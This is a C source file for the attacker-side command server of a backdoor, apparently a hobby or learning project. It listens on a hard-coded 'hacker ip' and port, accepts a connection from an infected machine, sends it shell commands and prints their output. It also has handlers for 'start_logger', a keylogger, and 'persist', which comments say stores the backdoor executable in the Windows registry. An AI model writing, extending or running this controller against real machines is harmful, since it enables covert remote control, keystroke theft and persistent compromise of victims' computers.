#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main()
{
    int sock, client_socket;
    char buffer[1024];
    char response[18384];

    struct sockaddr_in server_address, client_address; 

    int i = 0;
    int optval = 1;
    socklen_t client_length;

    sock = socket(AF_INET, SOCK_STREAM, 0); // these are documented in backdoor.c file

    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
    {
        printf("Error Setting TCP Socket Options!\n");
        return 1;
    }

    // setting up the server socket
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr("192.168.56.1"); // hacker ip
    server_address.sin_port = htons(50005);

    // binding the sock with server_address
    bind(sock, (struct sockaddr *)&server_address, sizeof(server_address));

    listen(sock, 5); // listening
    client_length = sizeof(client_address);
    // connecting with the client socket
    client_socket = accept(sock, (struct sockaddr *)&client_address, &client_length);

    while (1)
    {
    jump:
        // clearning the buffer and response with 0
        bzero(&buffer, sizeof(buffer));
        bzero(&response, sizeof(response));

        printf("\n* Shell#%s~$:", inet_ntoa(client_address.sin_addr)); // just a fancy client indiating line with it's ip addr

        fgets(buffer, sizeof(buffer), stdin);
        /*
         * stdin => is meant by how we want to access the information , or define simply where we are getting the commands?
         * we are getting the commands from standard input
         */

        /* 
         * we many receive the buffer with newline char so we are
         * removing the newline charecter from the buffer
         */
        strtok(buffer, "\n");


        write(client_socket, buffer, sizeof(buffer));
        /* 
         * write func is same as send
         * we using write because it is simpler than send since it takes only 3 args
         */

        if (strncmp("exit", buffer, 4) == 0) // if the buffer is exit then quite the program
        {
            break;
        }
        // else if (strncmp("close", buffer, 5) == 0)
        // {
        //     break;
        // }
        else if (strncmp("cd ",buffer,3) == 0){
            goto jump; // because it will not gonna receive any message and stuck in the else code block
        }
        else if (strncmp("start_logger",buffer,12) == 0){ // event to start the logger func
            goto jump;
        }
        else if (strncmp("persist",buffer,7) == 0){ // event to storing the backdoor exe file perminently in the windows registry
            recv(client_socket,response,sizeof(response),0);
            printf("%s\n",response);
        }
        else
        {
            recv(client_socket, response, sizeof(response), MSG_WAITALL);
            /* 
             * MSG_WAITALL => this flag will tell the program to block the operation until the full request is satisfied
             * if you are intrested in recv function and all it's flags
             * you can visit this site ->
             * https://man7.org/linux/man-pages/man2/recv.2.html
             */
            printf("%s", response);
        }
    }
}
